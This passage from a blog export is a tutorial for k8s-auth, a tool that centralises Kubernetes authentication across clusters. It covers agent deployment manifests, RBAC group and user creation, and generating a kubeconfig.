class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> K8S_AUTH_SEVER=https://auth.4n6nk8s.tech</span><br></pre></td></tr></table></figure>\n<p>Now you need to log in as an adminstrator! It’s not that hard just run  <code>k8s-auth login</code>  and forget to specify  <code>--admin</code>  to login as the super user!</p>\n<p><img data-src=\"https://imgur.com/10prjzn.png\" alt=\"\"></p>\n<p>The utility needs a secret token, which you’ll get from an URL link. This link will take you to Google for authentication and authorization as an admin. Once you’re authorized, you’ll get the secret token to paste and everything will be good to go.</p>\n<p>You’ll get something like this one in case you’re authorized!<br>\n<img data-src=\"https://imgur.com/Yt9FZgD.png\" alt=\"\"></p>\n<p>Copy that thing don’t worry! Once you paste it, the utility will verify the token and let you know if you’re ready for your actions or not!</p>\n<p><img data-src=\"https://imgur.com/MY7TTOZ.png\" alt=\"\"></p>\n<p>Bingo we are ready for action! Now as an admin you can register clusters, create,delete,modify users and groups (and their permissions) inside each cluster!</p>\n<blockquote>\n<p>Let’s assume that you have 2 clusters! You create a user inside cluster1 and you give him permission to list pods on dev namespace. You can add that user to cluster2 with other permission like create secrets on prod namespace</p>\n</blockquote>\n<p>It’s time to register a cluster! You’ll recieve a secret token.</p>\n<p><img data-src=\"https://imgur.com/yvANfkB.png\" alt=\"\"></p>\n<p>And as you see here! The cluster is registered using  <code>k8s-auth create cluster</code>  and you can list registred clusters with  <code>k8s-auth get clusters</code></p>\n<blockquote>\n<p>Keep in mind that registerd cluster have 2 status, not Active when the cluster is not verified yet. The Active status will show you the API SERVER address/hostname</p>\n</blockquote>\n<blockquote>\n<p>Only Admins can see the tokens! Running the same command as a regular user will list you only the clusters that you have access to it (so not all cluster) and without the token!</p>\n</blockquote>\n<p>Let’s take rest now from the CLI. It’s time for kubernetes! Let’s deploy the agent/controller that will communicate with the server!</p>\n<h2 id=\"deploy-the-agentcontroller-inside-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-agentcontroller-inside-kubernetes\">#</a> Deploy the Agent/Controller inside Kubernetes</h2>\n<p>Deploying the agent is not rocket science! Deploying the agent is not rocket science! (To be honest i didn’t make a helm chart yet, Sadly 😦 ). But if you want to do it the old fashioned way, no worries! It’s still a piece of cake. Just keep in mind that you need to create a namespace called “k8s-auth” in your cluster. This namespace will contain all the service accounts and secrets of the users that authenticate and have a session with the cluster.</p>\n<p>The agent’s mission is to make sure everyone gets what they need! It creates service accounts, roles, and role bindings to make sure users have the right permissions in the cluster. That’s why the agent itself needs a service account and permissions to do its job inside the cluster.</p>\n<p>Let’s create the namespace and the service account for this agent!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create ns & sa</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Namespace</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>This service account need a clusterrole that allow to create roles to anything!  to grant permission for creating pods you must have this permission first! You can’t give permission of create something and you can’t do it!!!</p>\n<p>Next, the service account will need an appropriate permissions to carry out its mission inside the cluster. Specifically, it requires a clusterrole that grants permission to create roles for any resource.</p>\n<p>In kubernetes world, granting permission to create something requires that you have the permission yourself!. For example, you can’t grant permission to create pods if you don’t have permission to create pods even you have permission to create roles!!</p>\n<p>Let’s create the clusterole and the binding!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create cluster role</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRoleBinding</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">roleRef:</span></span><br><span class=\"line\">  <span class=\"attr\">apiGroup:</span> <span class=\"string\">rbac.authorization.k8s.io</span></span><br><span class=\"line\">  <span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">subjects:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to the last part! we will deploy the agent itself! The agent need to know some information so as expected there is some environement variable!</p>\n<ul>\n<li><code>CLUSTER_NAME</code> : is the same name that you put it inside the authentication server</li>\n<li><code>TOKEN</code> : The generated token from the authentication server</li>\n<li><code>SERVER</code> : The authentication server itself</li>\n<li><code>API_SERVER</code> : This is contains the public hostname for the API SERVER. The agent can detect it correctly when you have a cluster inside Network and the cluster is not exposed in the internet</li>\n</ul>\n<blockquote>\n<p>I used kubeadm clusters in provisionning clusters. I didn’t find a way to find the public hostname! So you need to indicate the api server until it will be fixed!</p>\n</blockquote>\n<figure class=\"highlight yaml\"><figcaption><span>deploy</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">strategy:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">serviceAccountName:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-auth-kube</span> </span><br><span class=\"line\">        <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth-kube</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">CLUSTER_NAME</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">ctf-cluster</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">TOKEN</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;Z8taw1yFw4lsq7cgSvmZ&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;https://auth.4n6nk8s.tech&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">API_SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">https://172.190.91.84:6443</span></span><br><span class=\"line\">        <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After deploying the agent. you can check the clusters with the cli again and you’ll find everything is ok!<br>\n<img data-src=\"https://imgur.com/MqHeeY1.png\" alt=\"\"></p>\n<p>The cluster is on Active status and the api server is not empty now! You can repeat this operation with many clusters and this is how multi-clusters can work together!</p>\n<h2 id=\"create-users-and-groups\"><a class=\"markdownIt-Anchor\" href=\"#create-users-and-groups\">#</a> Create Users and Groups</h2>\n<p>The cluster is now ready for authentication and has been verified to be functioning without any issues. The connection between the cluster and authentication has been established. Now, let’s proceed to creating groups and users.</p>\n<p>Let’s see what  <code>k8s-auth create</code>  can do for us!</p>\n<p><img data-src=\"2023-04-29-15-56-38.png\" alt=\"\"></p>\n<p>Great news! With the  <code>k8s-auth create</code>  command, you can easily create groups and users for your authenticated clusters. To create a group, simply specify the cluster and provide a YAML manifest file containing the roles for that group. For creating a user, you can either assign them to an existing group or provide a YAML manifest file for the user’s roles if they do not belong to any group.</p>\n<p>Let’s define the role for our group that we will create!</p>\n<figure class=\"highlight yaml\"><figcaption><span>group rule</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">dev</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-and-secret</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>,<span class=\"string\">&quot;secrets&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>,<span class=\"string\">&quot;create&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">prod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-list</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>\n<p>The group we’re about to create will be granted permission to create and list pods and secrets in the “dev” namespace, while they will only be able to list pods in the “prod” namespace.</p>\n<blockquote>\n<p>Any user will be belong to this group will have these permissions! You don’t have to repeat the same manifest for each user!. This is why groups exists!</p>\n</blockquote>\n<p>This command will create the group for you</p>\n<figure class=\"highlight bash\"><figcaption><span>command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create group &lt;name&gt; --cluster=&lt;cluster&gt; --file=&lt;rbac_file&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/g5YBB8u.png\" alt=\"\"></p>\n<p>As you can see here! The group is create successfully and you can see his permission when you forget it using  <code>k8s-auth get permission</code>  command!</p>\n<p>You can discover what you can do with  <code>k8s-auth get</code>  command!! You can a list users too!</p>\n<p><img data-src=\"https://imgur.com/MOC7L1o.png\" alt=\"\"></p>\n<p>Now let’s create a user that belong to this group! So we don’t need to specify any manifest file that define roles!</p>\n<figure class=\"highlight bash\"><figcaption><span>user</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create user --name &lt;name&gt; --fullname &lt;value&gt; --mail &lt;mail&gt; --cluster &lt;cluster&gt; --group &lt;group&gt;</span><br></pre></td></tr></table></figure>\n<p>In case that you want to create a user that don’t belongs to any group and have his own permission you can delete the  <code>--group</code>  and change it with  <code>--file</code>  and specify the yaml file that contains his roles!</p>\n<blockquote>\n<p>No need to worry about naming roles because there won’t be any overlapping between them. The agent takes care of creating roles and bindings in the background, and the names you specify in the manifest won’t be used directly.</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/n2S8BQM.png\" alt=\"\"></p>\n<p>You can update the permission using the  <code>k8s-auth update permisssion</code>  command! This command can update groups and users permission</p>\n<p>In case you change the permission for a user that belgons to a group. This user will leave that group because he will have his own permissions (different from the group one)</p>\n<blockquote>\n<p>You can’t delete a group if is not empty!</p>\n</blockquote>\n<blockquote>\n<p>When User have an opened session with a cluster and use kubectl normally and you decide to delete that user the session will be closed and he can’t do anything!</p>\n</blockquote>\n<h2 id=\"authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#authenticate-to-a-cluster\">#</a> Authenticate to a cluster</h2>\n<p>As a regular user you need to login to the authentication server using  <code>k8s-auth login</code>  and you’ll receive a link as the admin login process!</p>\n<p>Then you can list the clusters that you can authenticate with using  <code>k8s-auth get clusters</code>  and keep in your mind that you’ll never see the token of each cluster (Only admins can see tokens)</p>\n<p>Once you decided which cluster you’ll authenticate! run the command  <code>k8s-auth auth</code>  with specifying the cluster name!</p>\n<figure class=\"highlight bash\"><figcaption><span>authenticate</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth auth cluster=ctf-cluster</span><br><span class=\"line\"></span><br><span class=\"line\">To use this cluster run this <span class=\"built_in\">command</span>: <span class=\"built_in\">export</span> KUBECONFIG=<span class=\"variable\">$HOME</span>/.k8s-auth.config</span><br></pre></td></tr></table></figure>\n<p>If you’re authorized, you’ll receive a message like that! What is happening?</p>\n<p>Actually the k8s-auth CLI generate a kubeconfig file for you! run the command that the CLI suggest to you! BOOOM Start Kubectlying !!! xD</p>\n<h2 id=\"conclusion\"><a class=\"markdownIt-Anchor\" href=\"#conclusion\">#</a> Conclusion</h2>\n<p>As highlighted in the blog post, the process of authentication has been simplified with just 3 simple commands - login, auth, and export KUBECONFIG. These commands enable users to easily open a session with any cluster they want, regardless of the number of clusters and different permissions required, using just a single set of credentials. Additionally, the administrator can easily set up agents in the clusters, and manage the permissions and the entire process centrally using a smooth command line interface.</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clfzirxn10002d5qf5eg8d4y5","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnl000dd5qfb7cx83ok"},{"post_id":"clfzirxne0009d5qfbbh65c00","category_id":"clfzirxnc0008d5qfbvksfp9r","_id":"clfzirxnp000hd5qf242t6953"},{"post_id":"clfzirxn60004d5qfgz9yavq2","category_id":"clfzirxnc0008d5qfbvksfp9r","_id":"clfzirxnr000jd5qfhf7i582f"},{"post_id":"clfzirxnf000ad5qf4ddigtnv","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnr000kd5qf6kx783i9"},{"post_id":"clfzirxnj000cd5qf1m8xb8rz","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnt000md5qfbvcdbdm7"},{"post_id":"clfzirxn90006d5qfdw7dddc7","category_id":"clfzirxnc0008d5qfbvksfp9r","_id":"clfzirxnt000nd5qf2vw42sxo"},{"post_id":"clfzirxnl000ed5qf5e3h3gpw","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnu000od5qf9j4v8r9f"},{"post_id":"clfzirxno000gd5qf52yccapx","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnu000qd5qf3399cqzq"},{"post_id":"clfzirxnb0007d5qfeu0hao90","category_id":"clfzirxnc0008d5qfbvksfp9r","_id":"clfzirxnu000rd5qf1sqbdw65"},{"post_id":"clfzirxnq000id5qfdcm89lua","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clfzirxnu000sd5qf93mmdfhl"},{"post_id":"clfzirxnw000td5qfatjtgudw","category_id":"clfzirxny000vd5qfgqe22qxz","_id":"clfzirxo0000xd5qfg0wn91rn"},{"post_id":"clfzirxnx000ud5qfazid25x9","category_id":"clfzirxny000vd5qfgqe22qxz","_id":"clfzirxo0000yd5qf3xxw40dw"},{"post_id":"clh23bah80000c7qf90btf5ac","category_id":"clfzirxn80005d5qf4m1rg9ls","_id":"clh23bahe0001c7qf2hhw0lq9"}],"PostTag":[{"post_id":"clfzirxnq000id5qfdcm89lua","tag_id":"clfzirxns000ld5qfcnjc3efg","_id":"clfzirxnu000pd5qf271l1724"}],"Tag":[{"name":"kubernetes","_id":"clfzirxns000ld5qfcnjc3efg"}]}}